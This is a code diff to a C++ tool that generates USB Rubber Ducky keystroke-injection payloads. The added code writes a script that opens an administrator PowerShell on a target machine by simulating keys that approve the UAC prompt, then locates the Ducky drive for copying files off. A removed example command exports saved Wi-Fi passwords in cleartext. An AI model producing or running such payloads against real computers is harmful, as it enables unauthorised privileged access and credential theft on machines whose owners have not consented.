@@ -33,7 +33,7 @@ int main() {
     int attackMode = 0;
 
     string fileNumber;
-    cout << "Warning !!!: Working on adding backspaces be careful when deleting empty space (non characters)" << endl << endl;
+    //cout << "Warning !!!: Working on adding backspaces be careful when deleting empty space (non characters)" << endl << endl;
     cout << "Enter file number: ";
     cin >> fileNumber;
     string file = "payload" + fileNumber + ".dd";
@@ -646,19 +646,48 @@ bool ChangeAttackMode(string file, unsigned char &key, int &attackMode){
             return true;
         }
         else {
-            string input;
-            cout << endl << "ATTACKMODE HID STORAGE" << endl;
-            fout << endl << "ATTACKMODE HID STORAGE" << endl;
-            cout << "\nREM - - -> Input powershell commands in sequential order seperated by ;<- - -" << endl;
-            cout << "REM --- Whatever is output to powershell terminal will be saved to a file on the RUBBER DUCKY ---" << endl << endl;
-            cout << "REM ---> EXAMPLES:" << endl << 
-                    "REM #1) cd $d; netsh wlan export profile key=clear;" << endl << endl
-                 << "REM #2) $env:computername >> $m:\\computer_names.txt" << endl << endl;
-            getline(cin, input);
-            cout << endl << "STRING powershell \"$m-(Get-Volume -FileSystemLabel \'DUCKY\').DriveLetter+\':\'; " 
-                 << input << "\"" << endl << endl;
-            fout << endl << "STRING powershell \"$m-(Get-Volume -FileSystemLabel \'DUCKY\').DriveLetter+\':\'; " 
-                 << input << "\"" << endl << endl;
+            string delay = "DELAY 600";
+            
+            cout << endl << "ATTACKMODE HID STORAGE" << endl << endl;
+            fout << endl << "ATTACKMODE HID STORAGE" << endl << endl;
+            //opens powershell in code and on machine in DUCKY filesystem 
+            // can use \Ducky: as drive letter
+            // transfer from ducky to machine or vice versa using cp
+            // run scripts directly on ducky using elevated commands
+            // python script.py, ./script.exe, etc. 
+            ShellExecute
+                ( NULL,
+                "runas",
+                "powershell.exe",
+                    "-NoExit -Command \"cd \\; $Ducky = $DriveLetter = Get-Volume -FileSystemLabel 'DUCKY' | % DriveLetter \"",
+                NULL,
+                SW_SHOWNORMAL);
+                
+            fout << endl << "REM Admin Powershell instance created in DUCKY script and on current machine" << endl << endl
+            << "GUI R" << endl << delay << endl
+            << "STRING powershell" << endl << delay << endl
+            << "CTRL SHIFT ENTER" << endl << delay << endl
+            << "ALT Y" << endl << delay << endl
+            << "STRING cd \\" << endl << delay << endl
+            << "ENTER" << endl << delay << endl
+            << "STRING $Ducky = Get-Volume -FileSystemLabel 'DUCKY' | % DriveLetter" << endl
+            << "ENTER" << endl << delay << endl;
+                        
+            cout << endl << "REM Admin Powershell instance created in DUCKY script and on current machine" << endl << endl
+            << "GUI R" << endl << delay << endl
+            << "STRING powershell" << endl << delay << endl
+            << "CTRL SHIFT ENTER" << endl << delay << endl
+            << "ALT Y" << endl << delay << endl
+            << "STRING cd \\" << endl << delay << endl
+            << "ENTER" << endl << delay << endl
+            << "STRING $Ducky = Get-Volume -FileSystemLabel 'DUCKY' | % DriveLetter" << endl
+            << "ENTER" << endl << delay << endl;
+
+            cout << endl << endl << "REM\t - - -Admin powershell opened  on current machine and in DUCKY script - - -"
+                 << endl << "\tUse \"cd ${Ducky}:\" to change to DUCKY drive and run custom scripts" << endl
+                 << "REM\t\t\tor" << endl
+                 << "REM\tcopy files directly to ducky using \"cp file.txt ${Ducky}:\\PremadeDataFolder\""
+                 << endl << endl;
             attackMode++;
                  return false;
         }
@@ -848,9 +877,9 @@ bool AddDelay(string file, unsigned char key){
 }
 
 bool DeleteLine(string file){
-    cout << endl << endl << "\tRemoving Delay . . ." << endl << endl;
+    cout << endl << endl << "\tDelay removed . . ." << endl << endl;
     CleanPayload(file);
-    cout << endl << endl << "\tDeleting line . . ." << endl << endl;
+    cout << endl << endl << "\tLine Deleted . . ." << endl << endl;
     Sleep(1);
     CleanPayload(file);
     cout << "REM PREVIOUS LINE DELETED" << endl;
